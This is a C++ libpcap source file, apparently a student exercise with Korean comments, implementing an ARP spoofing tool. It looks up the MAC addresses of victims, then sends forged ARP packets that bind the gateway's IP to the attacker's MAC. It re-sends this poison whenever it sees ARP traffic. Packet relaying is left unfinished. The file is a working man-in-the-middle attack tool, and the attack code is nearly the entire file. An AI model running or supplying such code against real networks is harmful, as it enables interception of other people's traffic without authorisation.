#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <cstring>
#include <map>

#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac.h"
#include "get_ip.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

// attacker's address 전역변수
Mac attackerMac;
Ip attackerIp;

pcap_t* handle;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

//Get sender's Mac
Mac send_arp_normal(Ip targetIp){
	EthArpPacket packet; //arp request packet

	//sender = ma, target = victim
	packet.eth_.smac_ = attackerMac;
	packet.eth_.dmac_ = Mac::broadcastMac(); //broadcast mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	
	//My info
	packet.arp_.smac_ = attackerMac;
	packet.arp_.sip_ = htonl(attackerIp);

	//Victim
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //anyting
	packet.arp_.tip_ = htonl(targetIp);
	
	while (true){
   		int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));                                               

		const u_char* cap_packet;
		struct pcap_pkthdr* header;
		
		int res = pcap_next_ex(handle, &header, &cap_packet);
		

		if (res == 0) continue;

		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);
	
		//check ARP Packet
		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
		//Check reply packet
		if(arp_hdr->op()!=ArpHdr::Reply) continue;
		//Check correct sender
		if(arp_hdr->sip()!=targetIp) continue;
		return Mac(static_cast<string>(arp_hdr->smac()));	
	}
	return Mac();
}

//send arp-spoof packet
void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
	printf("sent to.. %s", static_cast<string>(senderMac).c_str());
	EthArpPacket packet;
	packet.eth_.smac_ = attackerMac;
	packet.eth_.dmac_ = senderMac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.op_ = htons(ArpHdr::Request);
	// My mac
	packet.arp_.smac_ = attackerMac;
	// Target ip(gateway)
	packet.arp_.sip_ = htonl(targetIp);

	// Victim
	packet.arp_.tmac_ = senderMac;
	packet.arp_.tip_ = htonl(targetIp);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	//printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}

	//인터페이스 확인 후 예외처리하기.... 코드작성
	const char* interf = argv[1]; //interface

	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(interf, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interf, errbuf);
		return -1;
	}

	// address init
	string interface = interf;

	// Network, ARPEntry 
	map<Ip, Mac> Network;
	map<Ip, Ip> ARPEntry;

	attackerMac = get_mac(interface);
	attackerIp = get_ip(interface);
	Network.insert(make_pair(attackerIp, attackerMac));

	// Process each (Sender, Target) pair
	for (int i = 2; i < argc; i += 2) {
		Ip senderIp = Ip(argv[i]);      // Sender IP
		//ARPEntry에 있는 IP인지 확인
		if(Network.find(senderIp)==Network.end()){
			Mac senderMac = send_arp_normal(senderIp);
			Network.insert(make_pair(senderIp, senderMac));
		}

		Ip targetIp = Ip(argv[i + 1]); // Target IP
		//ARPEntry에 있는 IP인지 확인
		if(Network.find(targetIp)==Network.end()){
			Mac targetMac = send_arp_normal(targetIp);
			Network.insert(make_pair(targetIp, targetMac));
		}

		ARPEntry.insert(make_pair(senderIp, targetIp));

		send_arp_spoof(Network[senderIp], senderIp, targetIp);
		printf("sent arp spoof\n");
	}

	while(true){
		// int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		// //printf("sent arp spoofing for Sender IP: %s, Target IP: %s\n", senderIp.c_str(), targetIp.c_str());
		// if (res != 0) {
		// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		// }


		const u_char* cap_packet;
		struct pcap_pkthdr* header;
		
		// packet capture
		int res = pcap_next_ex(handle, &header, &cap_packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		// check packet
		const EthArpPacket* eth_arp_pkt = reinterpret_cast<const EthArpPacket*>(cap_packet);

		// ARP 패킷
		if (ntohs(eth_arp_pkt->eth_.type_) == EthHdr::Arp){
			const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);
			// if sender and target ip not in the Network 

			Ip senderIp = arp_hdr->sip();
			Mac senderMac = Network[senderIp];
			Ip targetIp = arp_hdr->tip();

			if(Network.find(senderIp)==Network.end() && Network.find(targetIp)==Network.end()) continue;

			if(arp_hdr->tmac().isBroadcast()){
				send_arp_spoof(Network[senderIp], senderIp,targetIp);
			}
			// sip가 센더로 저장되어있고 tip가 센더에 해당되는 ip가 아니라면 continue
			// sip가 제대로 통신할 수 있도록 ARP 리퀘스트는 해야함
			if(Network.find(senderIp)!=Network.end() && ARPEntry[senderIp]!=targetIp) continue;
		
			// sip가 센더혹은 타겟이면서 sip가 센더일 때 tip가 센더의 타켓이 아닌 패킷만 남음
			// 타겟의 ARP 받으면 무조건 ARP 날리기	

			send_arp_spoof(Network[senderIp], senderIp,targetIp);
			printf("sent arp spoof2\n");
		}

		//ARP가 아닌데 sip가 센더Ip면

	
		//check ARP Packet
		if (ntohs(eth_arp_pkt->eth_.type_) != EthHdr::Arp) continue;
		const ArpHdr* arp_hdr = &(eth_arp_pkt->arp_);

		// 공격 대상의 sender의 ARP 패킷이면
		// 센더 - 어택 -> 타겟 브로드 relay
		// if(ARPEntry.find(Network.find(arp_hdr->sip()))==ARPEntry.end()) continue;
		// Ip senderIp = arp_hdr->sip();
		// Ip targetIp = arp_hdr->tip();
		// //send_arp_spoof(attackerMac, attackerIp, ARPEntry[senderIp], senderIp, targetIp);
		

	}

	pcap_close(handle);
}

